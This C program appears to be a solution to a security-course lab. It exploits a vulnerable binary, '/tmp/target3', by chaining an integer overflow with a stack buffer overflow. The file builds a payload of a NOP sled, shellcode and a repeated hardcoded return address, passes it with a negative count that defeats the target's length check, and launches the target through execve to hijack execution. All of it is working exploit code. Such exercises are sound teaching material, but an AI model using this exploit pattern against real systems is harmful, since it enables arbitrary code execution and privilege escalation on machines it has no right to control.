#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

#define OVERFLOWSIZE 4900
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;
  args[1] = "hi there";
  args[2] = NULL;
  env[0] = NULL;

  int bsize = OVERFLOWSIZE;
  char *buffer;

  if (!(buffer = malloc(bsize)))
  {
    printf("Can't allocate memory.\n");
    exit(0);
  }
  // set the count number to a negative value to pass the verification in the target3.c program.
  // This number will make the multiplication underflow and thus allowing us to overflow the buffer
  strcpy(buffer, "-2147483403,");

  // fill the buffer with NOPs commands
  memset(&buffer[12], NOP, OVERFLOWSIZE - 12);

  // set the address of return in the middle of our NOPs in the buffer
  int *ptr = (int *)(buffer + (bsize / 2) - 2);
  int i = 0;
  for (i = (bsize / 2); i < bsize; i += 4)
  {
    *(ptr++) = 0xbfffe110;
  }
  // put the shellcode in the middle of the buffer
  char *ptr_shell = buffer;
  ptr_shell = buffer + (bsize / 2) - strlen(shellcode);

  int j = 0;
  for (j = 0; j < strlen(shellcode); j++)
  {
    *(ptr_shell++) = shellcode[j];
  }

  buffer[OVERFLOWSIZE - 1] = '\0';

  args[1] = buffer;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");
  return 0;
}
